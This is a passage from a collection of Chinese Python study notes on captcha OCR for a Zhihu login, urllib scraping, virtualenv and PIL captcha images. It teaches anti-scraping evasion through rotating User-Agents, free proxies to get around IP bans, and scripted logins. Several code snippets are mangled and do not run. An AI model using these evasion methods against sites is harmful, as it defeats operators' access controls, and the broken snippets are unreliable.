captcha_url = 'https://www.zhihu.com/captcha.gif?r=%d&type=login' % (time.time() * 1000)\n    response = sessiona.get(captcha_url, headers = headers)\n\n    data = {\n        \"_xsrf\":_xsrf,\n        \"email\":username,\n        \"password\":password,\n        \"remember_me\":True,\n        \"captcha\": captcha(response.content)\n    }\n\n    response = sessiona.post('https://www.zhihu.com/login/email', data = data, headers=headers)\n    print response.text\n\n    response = sessiona.get('https://www.zhihu.com/people/maozhaojun/activities', headers=headers)\n    print response.text\n\nif __name__ == \"__main__\":\n    #username = raw_input(\"username\")\n    #password = raw_input(\"password\")\n    zhihuLogin('xxxx@qq.com','ALAxxxxIME')\n```\n\n# 尝试处理中文字符\n如果手头上有中文的训练数据，也可以尝试对中文进行识别。\n命令：`tesseract --list-langs`可以查看当前支持的语言，`chi_sim`表示支持简体中文。\n![img](http://www.nikola.ltd/s/python/Spider/file/images/tesseract_language.png)\n\n那么在使用时候，可以指定某个语言来进行识别，如：\n```\ntesseract -l chi_sim paixu.png paixu\n```\n\n表现在程序里，则可以这么写：\n```python\n#!/usr/bin/env python\n# -*- coding:utf-8 -*-\n\nfrom PIL import Image\nimport subprocess\n\ndef cleanFile(filePath):\n    image = Image.open(filePath)\n\n    # 调用系统的tesseract命令, 对图片进行OCR中文识别\n    subprocess.call([\"tesseract\", \"-l\", \"chi_sim\", filePath, \"paixu\"])\n\n    # 打开文件读取结果\n    with open(\"paixu.txt\", 'r') as f:\n        print(f.read())\n\nif __name__ == \"__main__\":\n    cleanFile(\"paixu.png\")\n```"
  },
  {
    "title": "./notes/python库/urllib.md",
    "body": "\n# 简介\n所谓网页抓取，就是把URL地址中指定的网络资源从网络流中抓取出来。在Python中有很多库可以用来抓取网页，我们先学习`urllib2`。\n\n> urllib2 是 Python2.7 自带的模块(不需要下载，导入即可使用)\nurllib2 官方文档：https://docs.python.org/2/library/urllib2.html\nurllib2 源码：https://hg.python.org/cpython/file/2.7/Lib/urllib2.py\n\n**在python3中，urllib2 被改为urllib.request**\nurllib.request中常用方法：\n- `urlopen函数`\n- `Request函数`\n- `urlretrieve函数`\n- `HTTPHandler函数`\n- `HTTPSHandler函数`\n- `ProxyHandler函数`\n- `build_opener函数` \n- `install_opener函数`\n- `HTTPCookieProcessor函数`\n\nurllib.parse中常用的方法：\n- `urlencode函数`\n- `parse_qs函数`\n- `urlsplit函数`\n- `urlparse函数`\n\n# urlopen函数\n我们先来段代码：\n```python\n# 导入urllib2 库\nimport urllib.request\n\n# 向指定的url发送请求，并返回服务器响应的类文件对象，这句代码一执行完，这个session就结束了\nresponse = urllib.request.urlopen(\"http://www.baidu.com/\")\n\n# 类文件对象支持 文件对象的操作方法，如read()方法读取文件全部内容，返回字符串\nhtml = response.read()\nhtml1 = response.read().decode('utf-8')\n\n# 打印字符串\nprint(html)\n```\n执行写的python代码，将打印结果\n\n实际上，如果我们在浏览器上打开百度主页， 右键选择“查看源代码”，你会发现，跟我们刚才打印出来的是一模一样。也就是说，上面的4行代码就已经帮我们把百度的首页的全部代码爬了下来。\n\n以下对urlopen函数的进行详细讲解：\n1. url：请求的url。\n2. data：请求的data，如果设置了这个值，那么将变成post请求。\n3. 返回值：返回值是一个http.c1ient.HTTPResponse对象，这个对象是一个类文件句柄对象。\n\n**http.client.HTTPResponse对象中常用方法**\n- read(): 返回内容\n- getcode(): 返回响应码\n- geturl(): 返回实际数据的实际url，防止重定向问题\n- info(): 返回响应报文的报头\n\n# Request函数\n在我们第一个例子里，urlopen()的参数就是一个url地址；\n\n但是如果需要执行更复杂的操作，比如增加HTTP报头，必须创建一个 Request 实例来作为urlopen()的参数；而需要访问的url地址则作为 Request 实例的参数。\n\n我们编辑urllib2_request.py\n```python\nimport urllib.request\n\n# url 作为Request()方法的参数，构造并返回一个Request对象\nrequest = urllib.request.Request(\"http://www.baidu.com/\")\n\n# Request对象作为urlopen()方法的参数，发送给服务器并接收响应\nresponse = urllib.request.urlopen(request)\n\nhtml = response.read().decode('utf-8')\n\nprint(html)\n```\n\n运行结果是完全一样的：\n\n新建Request实例，除了必须要有 url 参数之外，还可以设置另外两个参数：\n1. data（默认空）：是伴随 url 提交的数据（比如要post的数据），同时 HTTP 请求将从 \"GET\"方式 改为 \"POST\"方式。\n2. headers（默认空）：是一个字典，包含了需要发送的HTTP报头的键值对。\n这两个参数下面会说到。\n\n# urlretrieve函数：\n这个函数可以方便的将网页上的一个文件保存到本地。以下代码可以非常方便的将百度的首页下载到本地：\n```python\nfrom urllib import request\nrequest.urlretrieve（'http://www.baidu.com/'，'baidu.html'）\n```\n\n# urlencode函数：\n用浏览器发送请求的时候，如果url中包含了中文或者其他特殊字符，那么浏览器会自动的给我们进行编码。而如果使用代码发送请求，那么就必须手动的进行编码，这时候就应该使用urlencode函数来实现。urlencode 可以把**字典数据**转换为uRL编码的数据。\n示例代码如下：\n```python\nfrom urllib import parse \ndata={'name'：“爬出基础”，‘greet'：‘hello world'，‘age'：180}\nas=parse.urlencode(data)\nprint(qs)\n```\n\n输出：`name=E7%88%ACXE8%99%ABXE5%9F%BA%E7%A1%808greet=hel1o+world&age=18e`\n\n# parse_qs函数：\n可以将经过编码后的url参数进行解码。示例代码如下：\n```python\nfrom ur11ib import parse \nq5=“name=E7%88%ACXE8%99%ABXE5%9F%BA%E7%A1%808greet=hel1o+world&age=18e°\nprint(parse.parse_qs(as))\n```\n\n输出:`{'name'：“爬出基础”，‘greet'：‘hello world'，‘age'：180}`\n\n# urlparse 和urlsplit：\n有时候拿到一个url，想要对这个url中的各个组成部分进行分割，那么这时候就可以使用urlparse或者是ur1sp1it来进行分割。urlparse 和urlsplit基本上是一模一样的。唯一不一样的地方是，urlparse 里面多了一个params 属性，而urlsplit没有这个params属性。比如有一个url为：url=\n`http://www.baidu.com/s;hel1o?wdepython&usernamesabc#1`，那么urlparse可以获取到hello，而urlsplit不可以获取到。url中的params也用得比较少。示例代码如下：\n\n```python\nfrom urllib import request, parse\nurl=‘http://ww.baidu.com/s？username=zhiliao'\n\nresult=parse.urlsplit(url)\n#result =parse.urlparse(url)\nprint(result)\n\nprint（'scheme:\"，result.scheme）\nprint（\"netloc:'，result.netloc）\nprint（\"path:'，result.path）\nprint（'query:\"，result.query）\n```\n\n# 添加Header信息\n在 HTTP Request 中加入特定的 Header，来构造一个完整的HTTP请求消息。\n可以通过调用`Request.add_header()` 添加/修改一个特定的header 也可以通过调用`Request.get_header()`来查看已有的header。\n\n**添加一个特定的header**\n```python\nfrom urllib import request\n\nurl = \"http://www.itcast.cn\"\n\n#IE 9.0 的 User-Agent\nheader = {\"User-Agent\" : \"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;\"} \nreq = request.Request(url, headers = header)\n\n#也可以通过调用Request.add_header() 添加/修改一个特定的header\nreq.add_header(\"Connection\", \"keep-alive\")\n\n# 也可以通过调用Request.get_header()来查看header信息\n# request.get_header(header_name=\"Connection\")\n\nresponse = request.urlopen(req)\n\nprint(response.code)     #可以查看响应状态码\nhtml = response.read()\n\nprint(html)\n```\n\n**随机添加/修改User-Agent**\n```python\nfrom urllib import request\nimport random\n\nurl = \"http://www.itcast.cn\"\n\nua_list = [\n    \"Mozilla/5.0 (Windows NT 6.1; ) Apple.... \",\n    \"Mozilla/5.0 (X11; CrOS i686 2268.111.0)... \",\n    \"Mozilla/5.0 (Macintosh; U; PPC Mac OS X.... \",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS... \"\n]\n\nuser_agent = random.choice(ua_list)\n\nrequest = request.Request(url)\n\n#也可以通过调用Request.add_header() 添加/修改一个特定的header\nrequest.add_header(\"User-Agent\", user_agent)\n\n# get_header()的字符串参数，第一个字母大写，后面的全部小写\nrequest.get_header(\"User-agent\")\n\nresponse = request.urlopen(request)\n\nhtml = response.read()\nprint(html)\n```\n\n# Handler处理器和自定义Opener\n- opener是 urllib2.OpenerDirector 的实例，我们之前一直都在使用的urlopen，它是一个特殊的opener（也就是模块帮我们构建好的）。\n- 但是基本的urlopen()方法不支持代理、cookie等其他的HTTP/HTTPS高级功能。所以要支持这些功能：\n  1. 使用相关的 `Handler处理器` 来创建特定功能的处理器对象；\n  2. 然后通过 `request.build_opener()`方法使用这些处理器对象，创建自定义opener对象；\n  3. 使用自定义的opener对象，调用`open()`方法发送请求。\n- 如果程序里所有的请求都使用自定义的opener，可以使用`request.install_opener()` 将自定义的 opener 对象 定义为 全局opener，表示如果之后凡是调用urlopen，都将使用这个opener（根据自己的需求来选择）\n\n## 简单的自定义opener()\n```python\nfrom urlib import request\n\n# 构建一个HTTPHandler 处理器对象，支持处理HTTP请求\nhttp_handler = request.HTTPHandler()\n\n# 构建一个HTTPHandler 处理器对象，支持处理HTTPS请求\n# http_handler = urllib2.HTTPSHandler()\n\n# 调用urllib2.build_opener()方法，创建支持处理HTTP请求的opener对象\nopener = request.build_opener(http_handler)\n\n# 构建 Request请求\nrequest = request.Request(\"http://www.baidu.com/\")\n\n# 调用自定义opener对象的open()方法，发送request请求\nresponse = opener.open(request)\n\n# 获取服务器响应内容\nprint(response.read())\n```\n\n这种方式发送请求得到的结果，和使用`urllib2.urlopen()`发送HTTP/HTTPS请求得到的结果是一样的。\n\n如果在 HTTPHandler()增加 `debuglevel=1`参数，还会将 Debug Log 打开，这样程序在执行的时候，会把收包和发包的报头在屏幕上自动打印出来，方便调试，有时可以省去抓包的工作。\n```python\n# 仅需要修改的代码部分：\n\n# 构建一个HTTPHandler 处理器对象，支持处理HTTP请求，同时开启Debug Log，debuglevel 值默认 0\nhttp_handler = urllib2.HTTPHandler(debuglevel=1)\n\n# 构建一个HTTPHSandler 处理器对象，支持处理HTTPS请求，同时开启Debug Log，debuglevel 值默认 0\nhttps_handler = urllib2.HTTPSHandler(debuglevel=1)\n```\n\n## ProxyHandler处理器(代理设置)\n使用代理IP，这是爬虫/反爬虫的第二大招，通常也是最好用的。\n很多网站会检测某一段时间某个IP的访问次数(通过流量统计，系统日志等)，如果访问次数多的不像正常人，它会禁止这个IP的访问。\n所以我们可以设置一些代理服务器，每隔一段时间换一个代理，就算IP被禁止，依然可以换个IP继续爬取。\nurllib2中通过ProxyHandler来设置使用代理服务器，下面代码说明如何使用自定义opener来使用代理：\n```python\nfrom urlib import request\n\n# 构建了两个代理Handler，一个有代理IP，一个没有代理IP\nhttpproxy_handler = request.ProxyHandler({\"http\" : \"124.88.67.81:80\"})\nnullproxy_handler = request.ProxyHandler({})\n\n# 代理开关，表示是否启用代理\nproxySwitch = True\n\n# 通过 urllib2.build_opener()方法使用这些代理Handler对象，创建自定义opener对象\n# 根据代理开关是否打开，使用不同的代理模式\nif proxySwitch:  \n    opener = request.build_opener(httpproxy_handler)\nelse:\n    opener = request.build_opener(nullproxy_handler)\n\nreq = request.Request(\"http://httpbin.org/ip\")\n\n# 1. 如果这么写，只有使用opener.open()方法发送请求才使用自定义的代理，而urlopen()则不使用自定义代理。\nresponse = opener.open(req)\n\n# 2. 如果这么写，就是将opener应用到全局，之后所有的，不管是opener.open()还是urlopen() 发送请求，都将使用自定义代理。\n# request.install_opener(opener)\n# response = urlopen(req)\n\nprint(response.read())\n```\n\n免费的开放代理获取基本没有成本，我们可以在一些代理网站上收集这些免费代理，测试后如果可以用，就把它收集起来用在爬虫上面。\n\n免费短期代理网站举例：\n- [西刺免费代理IP](http://www.xicidaili.com/)\n- [快代理免费代理](http://www.kuaidaili.com/free/inha/)\n- [Proxy360代理](http://www.proxy360.cn/default.aspx)\n- [全网代理IP](http://www.goubanjia.com/free/index.shtml)\n\n如果代理IP足够多，就可以像随机获取User-Agent一样，随机选择一个代理去访问网站。\n```python\nfrom urlib import request\nimport random\n\nproxy_list = [\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"},\n    {\"http\" : \"124.88.67.81:80\"}\n]\n\n# 随机选择一个代理\nproxy = random.choice(proxy_list)\n# 使用选择的代理构建代理处理器对象\nhttpproxy_handler = request.ProxyHandler(proxy)\n\nopener = request.build_opener(httpproxy_handler)\n\nrequest = request.Request(\"http://www.baidu.com/\")\nresponse = opener.open(request)\nprint (response.read())\n```\n\n但是，这些免费开放代理一般会有很多人都在使用，而且代理有寿命短，速度慢，匿名度不高，HTTP/HTTPS支持不稳定等缺点（免费没好货）。\n所以，专业爬虫工程师或爬虫公司会使用高品质的私密代理，这些代理通常需要找专门的代理供应商购买，再通过用户名/密码授权使用（舍不得孩子套不到狼）。\n\n# cookielib库和HTTPCookieProcessor处理器\n在Python处理Cookie，一般是通过`cookielib`模块和 urllib2模块的`HTTPCookieProcessor`处理器类一起使用。\n\n`cookielib模块`：主要作用是提供用于存储cookie的对象\n`HTTPCookieProcessor处理器`：主要作用是处理这些cookie对象，并构建handler对象。\n\n## cookielib库\n该模块主要的对象有CookieJar、FileCookieJar、MozillaCookieJar、LWPCookieJar。\n\n- `CookieJar`：管理HTTP cookie值、存储HTTP请求生成的cookie、向传出的HTTP请求添加cookie的对象。整个cookie都存储在内存中，对CookieJar实例进行垃圾回收后cookie也将丢失。\n- `FileCookieJar(filename,delayload=None,policy=None)`：从CookieJar派生而来，用来创建FileCookieJar实例，检索cookie信息并将cookie存储到文件中。filename是存储cookie的文件名。delayload为True时支持延迟访问访问文件，即只有在需要时才读取文件或在文件中存储数据。\n- `MozillaCookieJar(filename,delayload=None,policy=None)`：从FileCookieJar派生而来，创建与`Mozilla浏览器 cookies.txt兼容`的FileCookieJar实例。\n- `LWPCookieJar(filename,delayload=None,policy=None)`：从FileCookieJar派生而来，创建与`libwww-perl标准的 Set-Cookie3 文件格式`兼容的FileCookieJar实例。\n\n**其实大多数情况下，我们只用CookieJar()，如果需要和本地文件交互，就用 MozillaCookjar() 或 LWPCookieJar()**\n\n我们来做几个案例：\n**1. 获取Cookie，并保存到CookieJar()对象中**\n```python\nfrom urllib import request\nfrom http.cookiejar import CookieJar\n\n# 构建一个CookieJar对象实例来保存cookie\ncookiejar = CookieJar()\n\n# 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\nhandler=request.HTTPCookieProcessor(cookiejar)\n\n# 通过 build_opener() 来构建opener\nopener = request.build_opener(handler)\n\n# 以get方法访问页面，访问之后会自动保存cookie到cookiejar中\nopener.open(\"http://www.baidu.com\")\n\n## 可以按标准格式将保存的Cookie打印出来\ncookieStr = \"\"\nfor item in cookiejar:\n    cookieStr = cookieStr + item.name + \"=\" + item.value + \";\"\n\n## 舍去最后一位的分号\nprint(cookieStr[:-1])\n```\n\n我们使用以上方法将Cookie保存到cookiejar对象中，然后打印出了cookie中的值，也就是访问百度首页的Cookie值。\n\n运行结果如下：\n```\nBAIDUID=4327A58E63A92B73FF7A297FB3B2B4D0:FG=1;BIDUPSID=4327A58E63A92B73FF7A297FB3B2B4D0;H_PS_PSSID=1429_21115_17001_21454_21409_21554_21398;PSTM=1480815736;BDSVRTM=0;BD_HOME=0\n```\n\n**2. 访问网站获得cookie，并把获得的cookie保存在cookie文件中**\n```python\nfrom urllib import request\nfrom http.cookiejar import MozillaCookieJar\n\n# 保存cookie的本地磁盘文件名\nfilename = 'cookie.txt'\n\n# 声明一个MozillaCookieJar(有save实现)对象实例来保存cookie，之后写入文件\ncookiejar = MozillaCookieJar(filename)\n\n# 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\nhandler = request.HTTPCookieProcessor(cookiejar)\n\n# 通过 build_opener() 来构建opener\nopener = request.build_opener(handler)\n\n# 创建一个请求，原理同urllib2的urlopen\nresponse = opener.open(\"http://www.httpbin.org/cookies/set?cource=abc\")\n\n# 保存cookie到本地文件, 其中ignore_discard=True的作用是将过期 的cookies也保存\ncookiejar.save(ignore_discard=True)\n```\n\n**3. 从文件中获取cookies，做为请求的一部分去访问**\n```python\nfrom urllib import request\nfrom http.cookiejar import MozillaCookieJar\n\n# 创建MozillaCookieJar(有load实现)实例对象\ncookiejar = MozillaCookieJar()\n\n# 从文件中读取cookie内容到变量\ncookie.load('cookie.txt'，ignore_discard=True)\n\n# 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\nhandler = request.HTTPCookieProcessor(cookiejar)\n\n# 通过 build_opener() 来构建opener\nopener = request.build_opener(handler)\n\nresponse = opener.open(\"http://www.baidu.com\")\n```\n\n**4. 利用cookielib和post登录人人网**\n```python\nfrom urllib import request\nfrom http.cookiejar import CookieJar\n\n# 构建一个CookieJar对象实例来保存cookie\ncookiejar = CookieJar()\n\n# 2. 使用HTTPCookieProcessor()来创建cookie处理器对象，参数为CookieJar()对象\ncookie_handler = request.HTTPCookieProcessor(cookiejar)\n\n# 3. 通过 build_opener() 来构建opener\nopener = request.build_opener(cookie_handler)\n\n# 4. addheaders 接受一个列表，里面每个元素都是一个headers信息的元祖, opener将附带headers信息\nopener.addheaders = [(\"User-Agent\", \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\")]\n\n# 5. 需要登录的账户和密码\ndata = {\"email\":\"mr_mao_hacker@163.com\", \"password\":\"alaxxxxxime\"}  \n\n# 6. 通过urlencode()转码\npostdata = request.urlencode(data)\n\n# 7. 构建Request请求对象，包含需要发送的用户名和密码\nrequest = request.Request(\"http://www.renren.com/PLogin.do\", data = postdata)\n\n# 8. 通过opener发送这个请求，并获取登录后的Cookie值，\nopener.open(request)\n\n# 9. opener包含用户登录后的Cookie值，可以直接访问那些登录后才可以访问的页面\nresponse = opener.open(\"http://www.renren.com/410043129/profile\")  \n\n# 10. 打印响应内容\nprint(response.read())\n```\n\n模拟登录要注意几点：\n1. 登录一般都会先有一个HTTP GET，用于拉取一些信息及获得Cookie，然后再HTTP POST登录。\n2. HTTP POST登录的链接有可能是动态的，从GET返回的信息中获取。\n3. password 有些是明文发送，有些是加密后发送。有些网站甚至采用动态加密的，同时包括了很多其他数据的加密信息，只能通过查看JS源码获得加密算法，再去破解加密，非常困难。\n4. 大多数网站的登录整体流程是类似的，可能有些细节不一样，所以不能保证其他网站登录成功。\n\n当然，我们也可以直接发送账号密码到登录界面模拟登录，但是当网页采用JavaScript动态技术以后，想封锁基于HttpClient的模拟登录就太容易了，甚至可以根据你的鼠标活动的特征准确地判断出是不是真人在操作。所以，想做通用的模拟登录还得选别的技术，比如用内置浏览器引擎的爬虫(关键词：Selenium ，PhantomJS)，这个我们将在以后会学习到。"
  },
  {
    "title": "./notes/python库/virtualenv.md",
    "body": "# virtualenv详解\n在开发Python应用程序的时候，系统安装的Python3只有一个版本：3.4。所有第三方的包都会被pip安装到Python3的site-packages目录下。\n\n如果我们要同时开发多个应用程序，那这些应用程序都会共用一个Python，就是安装在系统的Python 3。如果应用A需要jinja 2.7，而应用B需要jinja 2.6怎么办？\n\n这种情况下，每个应用可能需要各自拥有一套“独立”的Python运行环境。virtualenv就是用来为一个应用创建一套“隔离”的Python运行环境。\n\n首先，我们用pip安装virtualenv：\n```shell\n$ pip3 install virtualenv\n```\n然后，假定我们要开发一个新的项目，需要一套独立的Python运行环境，可以这么做：\n\n第一步，创建目录：\n```shell\nMac:~ michael$ mkdir myproject\nMac:~ michael$ cd myproject/\nMac:myproject michael$\n```\n第二步，创建一个独立的Python运行环境，命名为venv：\n```shell\nMac:myproject michael$ virtualenv --no-site-packages venv\nUsing base prefix '/usr/local/.../Python.framework/Versions/3.4'\nNew python executable in venv/bin/python3.4\nAlso creating executable in venv/bin/python\nInstalling setuptools, pip, wheel...done.\n```\n命令virtualenv就可以创建一个独立的Python运行环境，我们还加上了参数--no-site-packages，这样，已经安装到系统Python环境中的所有第三方包都不会复制过来，这样，我们就得到了一个不带任何第三方包的“干净”的Python运行环境。\n\n新建的Python环境被放到当前目录下的venv目录。有了venv这个Python环境，可以用source进入该环境：\n```shell\nMac:myproject michael$ source venv/bin/activate\n(venv)Mac:myproject michael$\n```\n注意到命令提示符变了，有个(venv)前缀，表示当前环境是一个名为venv的Python环境。\n\n下面正常安装各种第三方包，并运行python命令：\n```shell\n(venv)Mac:myproject michael$ pip install jinja2\n...\nSuccessfully installed jinja2-2.7.3 markupsafe-0.23\n(venv)Mac:myproject michael$ python myapp.py\n...\n```\n在venv环境下，用pip安装的包都被安装到venv这个环境下，系统Python环境不受任何影响。也就是说，venv环境是专门针对myproject这个应用创建的。\n\n退出当前的venv环境，使用deactivate命令：\n```shell\n(venv)Mac:myproject michael$ deactivate \nMac:myproject michael$ \n```\n此时就回到了正常的环境，现在pip或python均是在系统Python环境下执行。\n\n完全可以针对每个应用创建独立的Python运行环境，这样就可以对每个应用的Python环境进行隔离。\n\nvirtualenv是如何创建“独立”的Python运行环境的呢？原理很简单，就是把系统Python复制一份到virtualenv的环境，用命令source venv/bin/activate进入一个virtualenv环境时，virtualenv会修改相关环境变量，让命令python和pip均指向当前的virtualenv环境。\n\n## 虚拟环境的原理\n上面的实操指南，只要照做，就能把虚拟环境用起来。 用多了，自然能够理解它。 virtualenv是如何创建一个隔离的Python虚拟环境？这个环境有什么特点？\n\n这个环境的特点有二：\n- Python版本固定。即使系统的Python升级了，虚拟环境中的仍然不受影响，保留开发状态。\n- 所有Python软件包，都只在这个环境生效。一旦退出，则回到用户+系统的默认环境中。\n\n这两个特点，由两个小手段实现。\n\n- 改变当前Shell的`PATH`。\n- 改变Python运行时的`sys.path`。\n以下为`python:alpine`镜像中，以root用户演示的例子。\n\n### 改变PATH\n首先看一下它的目录结构：\n```bash\n# ls venv\nbin      include  lib\n# ls /usr/local\nbin      include  lib      share\n```\n环境内所有的新内容，都在这个新生成目录下。 bin是可执行文件的位置，include是C/C++的头文件位置，lib是库文件位置。 它和`/usr/local`内的主要目录几乎相同，也和`~/.local`下类似。\n\n魔法都在两个`PATH`中。\n\n```bash\n# echo $PATH\n/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n# . venv/bin/activate\n(venv) # echo $PATH\n/root/venv/bin:/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n```\n显然，这个`activate`，为当前`PATH`增加了`venv/bin`这个位置在最前方，因此虚拟环境中的可执行文件拥有最高优先级。 而`lib`与`include`，仅仅是`bin`下面的可执行文件做相对路径运算来寻找的位置。 所以，改变了`PATH`，就改变了很多事。\n\n```bash\n# ls -hl venv/bin/\ntotal 88\n-rw-r--r--    1 root     root        2.0K Mar 31 08:06 activate\n-rw-r--r--    1 root     root        1.1K Mar 31 08:06 activate.csh\n-rw-r--r--    1 root     root        3.0K Mar 31 08:06 activate.fish\n-rw-r--r--    1 root     root        1.5K Mar 31 08:06 activate.ps1\n-rw-r--r--    1 root     root         986 Mar 31 08:06 activate.xsh\n-rw-r--r--    1 root     root        1.5K Mar 31 08:06 activate_this.py\n-rwxr-xr-x    1 root     root         238 Mar 31 08:06 easy_install\n-rwxr-xr-x    1 root     root         238 Mar 31 08:06 easy_install-3.7\n-rwxr-xr-x    1 root     root         220 Mar 31 08:06 pip\n-rwxr-xr-x    1 root     root         220 Mar 31 08:06 pip3\n-rwxr-xr-x    1 root     root         220 Mar 31 08:06 pip3.7\n-rwxr-xr-x    1 root     root       35.8K Mar 31 08:06 python\n-rwxr-xr-x    1 root     root        2.3K Mar 31 08:06 python-config\nlrwxrwxrwx    1 root     root           6 Mar 31 08:06 python3 -> python\nlrwxrwxrwx    1 root     root           6 Mar 31 08:06 python3.7 -> python\n-rwxr-xr-x    1 root     root         216 Mar 31 08:06 wheel\n```\n\n由于优先级最高，所以环境里的`python`、`pip`等，包括后来用`pip`安装的可执行文件，都使用的是`venv`下的。\n\n### 改变sys.path\n\n```bash\n(venv) # python -m site\nsys.path = [\n    '/root',\n    '/root/venv/lib/python37.zip',\n    '/root/venv/lib/python3.7',\n    '/root/venv/lib/python3.7/lib-dynload',\n    '/usr/local/lib/python3.7',\n    '/root/venv/lib/python3.7/site-packages',\n]\nUSER_BASE: '/root/.local' (doesn't exist)\nUSER_SITE: '/root/.local/lib/python3.7/site-packages' (doesn't exist)\nENABLE_USER_SITE: False\n(venv) # deactivate\n# python -m site\nsys.path = [\n    '/root',\n    '/usr/local/lib/python37.zip',\n    '/usr/local/lib/python3.7',\n    '/usr/local/lib/python3.7/lib-dynload',\n    '/usr/local/lib/python3.7/site-packages',\n]\nUSER_BASE: '/root/.local' (doesn't exist)\nUSER_SITE: '/root/.local/lib/python3.7/site-packages' (doesn't exist)\nENABLE_USER_SITE: True\n```\n\n可见，sys.path发生了翻天覆地的变化。 除了当前路径`/root`和标准库`/usr/local/lib/python3.7`被保留以外，其它位置都换成了`venv`下的。 这就是为什么`pip list`看不见什么软件包的原因，也是环境隔离的最大秘密。\n\n## 标准库venv\n从Python 3.3开始，标准库中就自带了一个venv模块，拥有virtualenv的部分功能。 因此，也可以通过以下命令来创建虚拟环境。\n```bash\npython3 -m venv venv\n```\n\n但还是推荐使用`virtualenv`。 `venv`只能创建当前版本的虚拟环境，不能创建其它Python 3.x的版本，以及Python 2的环境。\n\n这个 venv 的原理，还是和上面我们说过的一样。但是 Python3 有一些提升，它的 Python 可执行文件是一个软连接了，用一个 `pyvenv.cfg` 来标志出 home 的位置。\n\n```txt\n├── myenv\n│   ├── bin\n│   │   ├── activate\n│   │   ├── activate.csh\n│   │   ├── activate.fish\n│   │   ├── easy_install\n│   │   ├── easy_install-3.7\n│   │   ├── pip\n│   │   ├── pip3\n│   │   ├── pip3.7\n│   │   ├── python -> python3\n│   │   └── python3 -> /usr/local/bin/python3\n│   ├── include\n│   ├── lib\n│   │   └── python3.7\n│   └── pyvenv.cfg\n```\n它的文件内容如下：\n\n```txt\nFile: myenv/pyvenv.cfg\nhome = /usr/local/bin\ninclude-system-site-packages = false\nversion = 3.7.3\n```\n如果 `include-system-site-packages` 为 `true`，解释器启动的时候就会将系统的库添加到 `sys.path` 里面，这样我们在虚拟环境就可以 `import` 系统中安装的包了。\n\n"
  },
  {
    "title": "./notes/python库/PIL.md",
    "body": "---\ntitle: python模块之PIL模块\ndate: 2019/12/1\nupdate: {{ date }}\ncategories:\n - back-end\n - python\n---\n# PIL里的类了\n```python\nfrom PIL import Image\nfrom PIL import ImageFont\nfrom PIL import ImageDraw\nfrom PIL import ImageFilter\n```\n\n# PIL常用方法\n```python\nopen()  #打开图片\n\nnew(mode,size,color)   #创建一张空白图片\n\nsave(\"test.gif\",\"GIF\")   #保存（新图片路径和名称，保存格式）\n\nsize   #获取图片大小\n\nthumbnail(weight,high)   #缩放图片大小（宽，高）\n\nload() # 返回图片的像素矩阵， 矩阵中的每一个元素都是一个四元组， 代表这个像素的RGB与透明度\n\nshow()    #显示图片\n\nblend(img1,img2,alpha)   #两张图片相加，alpha表示img1和img2的比例参数。\n\ncrop()   #剪切，提取某个矩阵大小的图像。它接收一个四元素的元组作为参数，各元素为（left, upper, right, lower），坐标系统的原点（0, 0）是左上角。\n\nrotate(45)    #逆时针旋转45度\n\ntranspose()    #旋转图像\n    transpose(Image.FLIP_LEFT_RIGHT)       #左右对换。\n    transpose(Image.FLIP_TOP_BOTTOM)       #上下对换。\n    transpose(Image.ROTATE_90)             #旋转 90 度角。\n    transpose(Image.ROTATE_180)            #旋转 180 度角。\n    transpose(Image.ROTATE_270)            #旋转 270 度角。\n\npaste(im,box)#粘贴box大小的im到原先的图片对象中。\n\nconvert()    #用来将图像转换为不同色彩模式。\n\nfilters()     #滤镜\n    BLUR   #虚化\n    EMBOSS\nresize((128,128))     #resize成128*128像素大小\n\nconvert(\"RGBA\")    #图形类型转换\n\ngetpixel((4,4))   #获取某个像素位置的值\n\nputpixel((4,4),(255,0,0))    #写入某个像素位置的值\n```\n# PIL应用\n我们主要用PIL来生成一张验证码的随机图，下面，我们就一步步来做一个小示例\n\n1. 生成一张固定尺寸固定颜色的图片\n```python\nfrom PIL import Image\n# 获取一个Image对象，参数分别是RGB模式。宽150，高30，红色\nimage = Image.new('RGB',(150,30),'red')\n# 保存到硬盘，名为test.png格式为png的图片\nimage.save(open('test.png','wb'),'png')\n```\n2. 生成一张随机颜色的图片\n```python\nfrom PIL import Image\nimport random\ndef getRandomColor():\n    '''获取一个随机颜色(r,g,b)格式的'''\n    c1 = random.randint(0,255)\n    c2 = random.randint(0,255)\n    c3 = random.randint(0,255)\n    return (c1,c2,c3)\n# 获取一个Image对象，参数分别是RGB模式。宽150，高30，随机颜色\nimage = Image.new('RGB',(150,30),getRandomColor())\n# 保存到硬盘，名为test.png格式为png的图片\nimage.save(open('test.png','wb'),'png')\n```\n3. 生成一张带有固定字符串的随机颜色的图片\n\n```python\nfrom PIL import Image\nfrom PIL import ImageDraw\nfrom PIL import ImageFont\nimport random\ndef getRandomColor():\n    '''获取一个随机颜色(r,g,b)格式的'''\n    c1 = random.randint(0,255)\n    c2 = random.randint(0,255)\n    c3 = random.randint(0,255)\n    return (c1,c2,c3)\n\n# 获取一个Image对象，参数分别是RGB模式。宽150，高30，随机颜色\nimage = Image.new('RGB',(150,30),getRandomColor())\n\n# 获取一个画笔对象，将图片对象传过去\ndraw = ImageDraw.Draw(image)\n\n# 获取一个font字体对象参数是ttf的字体文件的目录，以及字体的大小\nfont=ImageFont.truetype(\"kumo.ttf\",size=32)\n\n# 在图片上写东西,参数是：定位，字符串，颜色，字体\ndraw.text((20,0),'fuyong',getRandomColor(),font=font)\n\n# 保存到硬盘，名为test.png格式为png的图片\nimage.save(open('test.png','wb'),'png')\n```\n效果：\n![](https://gitee.com/naiswang/images/raw/master/20190926191451.png)\n\n\n4. 生成一张带有随机字符串随机颜色的图片\n\n```python\nfrom PIL import Image\nfrom PIL import 